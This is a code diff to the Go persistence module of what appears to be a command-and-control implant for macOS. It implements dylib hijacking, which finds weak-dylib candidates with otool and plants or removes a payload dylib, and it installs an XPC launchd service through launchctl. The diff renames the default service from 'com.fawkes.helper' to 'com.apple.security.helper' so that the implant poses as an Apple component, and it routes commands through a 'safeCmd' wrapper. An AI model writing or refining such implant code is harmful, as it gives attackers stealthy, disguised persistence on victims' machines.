@@ -5,7 +5,6 @@ package commands
 import (
 	"fmt"
 	"os"
-	"os/exec"
 	"path/filepath"
 	"strings"
 
@@ -68,7 +67,7 @@ func findWeakDylibCandidates(searchPath string) []dylibCandidate {
 			return nil
 		}
 
-		out, err := exec.Command("otool", "-l", path).CombinedOutput()
+		out, err := safeCmd("otool", "-l", path).CombinedOutput()
 		if err != nil {
 			return nil
 		}
@@ -111,10 +110,10 @@ func findWeakDylibCandidates(searchPath string) []dylibCandidate {
 
 func persistDylibHijackInstall(args persistArgs) structs.CommandResult {
 	if args.Path == "" {
-		return errorResult("Error: path (payload dylib to plant) is required")
+		return errorResult("path (payload dylib to plant) is required")
 	}
 	if args.Name == "" {
-		return errorResult("Error: name (target dylib path to hijack, from scan results) is required")
+		return errorResult("name (target dylib path to hijack, from scan results) is required")
 	}
 
 	if _, err := os.Stat(args.Path); os.IsNotExist(err) {
@@ -143,7 +142,7 @@ func persistDylibHijackInstall(args persistArgs) structs.CommandResult {
 func persistDylibHijackRemove(args persistArgs) structs.CommandResult {
 	target := args.Name
 	if target == "" {
-		return errorResult("Error: name (planted dylib path) is required")
+		return errorResult("name (planted dylib path) is required")
 	}
 
 	if _, err := os.Stat(target); os.IsNotExist(err) {
@@ -170,10 +169,10 @@ func persistXPCService(args persistArgs) structs.CommandResult {
 
 func persistXPCServiceInstall(args persistArgs) structs.CommandResult {
 	if args.Path == "" {
-		return errorResult("Error: path (executable for XPC service) is required")
+		return errorResult("path (executable for XPC service) is required")
 	}
 
-	name := "com.fawkes.helper"
+	name := "com.apple.security.helper"
 	if args.Name != "" {
 		name = args.Name
 		if !strings.Contains(name, ".") {
@@ -222,7 +221,7 @@ func persistXPCServiceInstall(args persistArgs) structs.CommandResult {
 		return errorf("Failed to write plist %s: %v", plistPath, err)
 	}
 
-	loadCmd := exec.Command("launchctl", "load", "-w", plistPath)
+	loadCmd := safeCmd("launchctl", "load", "-w", plistPath)
 	if out, err := loadCmd.CombinedOutput(); err != nil {
 		return successResult(fmt.Sprintf("XPC service plist created at %s but launchctl load failed: %v\n%s\n\nThe service will load on next login/reboot.",
 			plistPath, err, string(out)))
@@ -238,7 +237,7 @@ func persistXPCServiceInstall(args persistArgs) structs.CommandResult {
 }
 
 func persistXPCServiceRemove(args persistArgs) structs.CommandResult {
-	name := "com.fawkes.helper"
+	name := "com.apple.security.helper"
 	if args.Name != "" {
 		name = args.Name
 		if !strings.Contains(name, ".") {
@@ -260,7 +259,7 @@ func persistXPCServiceRemove(args persistArgs) structs.CommandResult {
 			continue
 		}
 
-		exec.Command("launchctl", "unload", "-w", plistPath).Run()
+		safeCmd("launchctl", "unload", "-w", plistPath).Run()
 
 		if err := os.Remove(plistPath); err != nil {
 			return errorf("Failed to remove %s: %v", plistPath, err)
